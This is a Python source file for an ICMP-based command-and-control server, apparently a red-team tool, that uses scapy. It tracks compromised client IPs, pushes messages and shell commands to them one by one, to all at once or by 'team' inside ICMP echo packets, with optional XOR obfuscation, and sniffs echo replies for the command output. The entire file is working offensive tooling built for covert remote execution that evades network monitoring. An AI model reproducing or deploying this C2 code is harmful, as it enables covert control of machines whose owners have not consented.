from scapy.all import * 
from scapy.all import ICMP,IP
import json
import threading

# STILL IN PRODUCTION

DEBUG = True                   # Set to display statements after command execution
DEVDEBUG = False               # Set to display statements specific to debugging issues
JSONFILE = "example.json"      # Set to point to configuration files with loadclients
SuperSecretMode = False         # Enables "encryption"
KEY = "B"
CLOUD = "172"
LAN = "10"

def print_title(): 
    print(".__                          ___             .__.__    ___") 
    print("|__| ____  __ ________      /  /   _______  _|__|  |   \  \\") 
    print("|  _/ ___\|  |  \____ \    /  /  _/ __ \  \/ |  |  |    \  \\")  
    print("|  \  \___|  |  |  |_> >  (  (   \  ___/\   /|  |  |__   )  )") 
    print("|__|\___  |____/|   __/    \  \   \___  >\_/ |__|____/  /  /")  
    print("        \/      |__|        \__\      \/               /__/") 

def print_help():
    print("\taddclient <IP_ADDRESS>   Adds new client by IP")
    print("\tls                       Show all added clients")
    print("\tremoveclient <ID>        Removes a client by ID")
    print("\tremoveallclients         Removes all clients")
    print("\tsend <ID> <message>      Send message to client at ID")
    print("\texe <ID> <command>       Send command to client at ID")
    print("\tsendtoall <message>      Sends <message> to all clients")
    print("\texeonall <command>       Execute <command> on all clients")
    print("\tloadclients              Loads all clients specified in JSONFILE")
    # print("\tshell <ID>               Creates a direct line with client at ID")
    print("\tkill                     Stops server")
    print("\tssm                      Enables Super Secret Mode")                    
    print("\thelp                     Prints this")

# Add clients to the dictionary of clients, the IP from arguments, and the id
def addclient(clients, arguments, id):
    clients[id] = arguments[1] 
    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}") 
    id += 1
    return id

# Add clients with the JSON configuration
def json_add_client(ip, clients, id):
    clients[id] = ip
    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}")
    id += 1
    return id

# Show all clients within the client dictionary 
def showclients(clients):
    for client in clients:
        print(f"Client {client} at {clients.get(client)}")

# Remove the client by client ID
def removeclient(arguments, clients):
    if len(arguments)<2: 
        print("[ERROR] Specify client by ID")
    else:
        if DEBUG: print(f"[DEBUG] Client {arguments[1]} removed from {clients.get(int(arguments[1]))}") 
        clients.pop(int(arguments[1]))

# Remove all clients within the client dictionary
def removeallclients(clients):
    clients.clear()
    if DEBUG: print(f"[DEBUG] All clients removed")

# Send command to client by ID via ICMP data, max of 1472 data bytes
def send_command(arguments, clients, execute):
    global SuperSecretMode
    try:
        clientcommand = arguments[1] 
        clienttokens = clientcommand.split(" ", 1)
        if clients.get(int(clienttokens[0])) != None:
            if DEVDEBUG: print(len(clienttokens[1].encode('utf-8')))

            # TODO FOR PACKET SEGMENTATION
            # if len(clienttokens[1].encode('utf-8')) > 1469:
            #     piece = clienttokens[1][:1469]
            #     segment = "!!!" + piece 
            #  segments = len(clienttokens[1].encode('utf-8'))//1469
            # if DEVDEBUG: print(segments)

            send_over_icmp(clients.get(int(clienttokens[0])), clienttokens[1], execute)
            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)")
            if DEBUG and not SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
        else:
            print(f"[ERROR] No client at ID {clienttokens[0]}")
    except:
        print("[ERROR] Usage: send <ID> <message>")

# "Encryption" for SuperSecretMode
def encrypt_decrypt(plaintext):
    encrypted = ""
    for i in range(len(plaintext)):
        encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
    return encrypted

# Send the command and add header
def send_over_icmp(clientip, command, execute):
    global SuperSecretMode
    encrypted = encrypt_decrypt(command)
    if execute:
        if SuperSecretMode:
            clientcommand = "!!!$1" + encrypted
        else:
            clientcommand = "!!!01" + command         
    else:
        if SuperSecretMode:
            clientcommand = "!!!$0" + encrypted
        else:
            clientcommand = "!!!00" + command
    
    evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
    send(evil)

# TODO Execute on all clients
# Send command to all clients
def sendtoall(arguments, clients, execute):
    global SuperSecretMode
    if len(arguments)<2 or arguments[1] == "": 
        print("[ERROR] Usage: sendtoall <message>")
    else:
        for client in clients:
            send_over_icmp(clients.get(client), arguments[1], execute)
            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
            elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")

def exeonall(arguments, clients, execute):
    global SuperSecretMode
    if len(arguments)<3 or arguments[1] == "": 
        print("[ERROR] Usage: exeonall <message>")
    else:
        for client in clients:
            send_over_icmp(clients.get(client), arguments[1], execute)
            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
            elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")

def exeonteam(arguments, clients, execute):
    global SuperSecretMode
    if len(arguments)<2: 
        print("[ERROR] Usage: exeonteam <team> <message>")
    else:
        for client in clients:
            octets = clients.get(client).split('.')
            if octets[0] == LAN:
                if str(arguments[1][0]) == str(octets[1]):
                    send_over_icmp(clients.get(client), arguments[1], execute)
                    if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
                    elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
            if octets[0] == CLOUD:
                if str(arguments[1][0]) == str(octets[2]):
                    send_over_icmp(clients.get(client), arguments[1], execute)
                    if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
                    elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")

# TODO Repair or remove
# # Place icupS into single client mode
# def shell(clients, arguments):
#     print("Type \"kill\" to exit")
#     while(True):
#         command = input(f"{clients.get(int(arguments[1]))} >> ")
#         if command == "kill":
#             break
#         send_over_icmp(clients.get(arguments[1]), command)
#         if DEBUG: print(f"[DEBUG] \"{command}\" sent to {arguments[1]} at {clients.get(int(arguments[1]))}")

# Checks if an IP is valid
def valid_IP(arguments):
    a = arguments[1].split('.')
    if len(a) != 4:
        return False
    for x in a:
        if not x.isdigit():
            return False
        i = int(x)
        if i < 0 or i > 255:
            return False
    return True

# Create clients based on JSON file
def generate_targets(JSONFILE, clients, id):
    f = open(JSONFILE, 'r')
    data = json.loads(f.read())
    for jsonip in data:
        ip = data[jsonip]
        id = json_add_client(ip, clients, id)
    f.close()
    return id

# TODO Parse newlines from output
def listen(pkt):
    src = pkt[IP].dst 
    payload = str(pkt.payload)
    parsed = re.split('#{3}', payload)
    if len(parsed) == 1:
        return
    else:
        command = parsed[1][:-1]
        if command[0] == "$":
            output = encrypt_decrypt(command[1:])
            newlineparsed = output.replace("\\\\n","\n")
            print(f"Recieved:\n\t{newlineparsed} from {src}")

        else: 
            newlineparsed = command[2:].replace("\\\\n","\n")
            print(f"Recieved:\n\t{command[0:2]} {newlineparsed} from {src}")

        

def sniffer():
    sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)

def change_ssm():
    global SuperSecretMode
    if SuperSecretMode: 
        SuperSecretMode = False
        print("SSM Disabled")
    else: 
        SuperSecretMode = True
        print("SSM Enabled")

def main():
    print_title()
    print("Enter command to begin, or \"help\" for help:")
    threading.Thread(target=sniffer, daemon=True).start()
    clients = dict()
    id = 0
    while(True):
        command = input(">> ")
        arguments = command.split(" ", 1)
        if arguments[0] == "":
            continue
        elif arguments[0] == "addclient":
            if len(arguments)<2: 
                print("[ERROR] Missing client IP field")
                continue
            if valid_IP(arguments): 
                id = addclient(clients, arguments, id)
            else:
                print("[ERROR] Invalid IP Address")
        elif arguments[0] == "ls":
            showclients(clients)
        elif arguments[0] == "removeclient":
            removeclient(arguments, clients)
        elif arguments[0] == "removeallclients":
            removeallclients(clients)
        elif arguments[0] == "exe":
            send_command(arguments, clients, execute=True)
        elif arguments[0] == "send":
            send_command(arguments, clients, execute=False)
        elif arguments[0] == "sendtoall":
            sendtoall(arguments, clients, execute=False)
        elif arguments[0] == "exeonall":
            exeonall(arguments, clients, execute=True)
        elif arguments[0] == "sendtoteam":
            exeonteam(arguments, clients, execute=False)
        elif arguments[0] == "exeonteam":
            exeonteam(arguments, clients, execute=True)
        elif arguments[0] == "loadclients":
            id = generate_targets(JSONFILE, clients, id)
        # elif arguments[0] == "shell":  [DONT WORRY ABOUT IT]
        #     shell(clients, arguments)
        elif arguments[0] == "kill":
            print_title()
            break
        elif arguments[0] == "ssm":
            change_ssm()
        elif arguments[0] == "help":
            print_help()
        else:
            print("Invalid option, use \"help\" for available commands")


if __name__ == "__main__":
    main()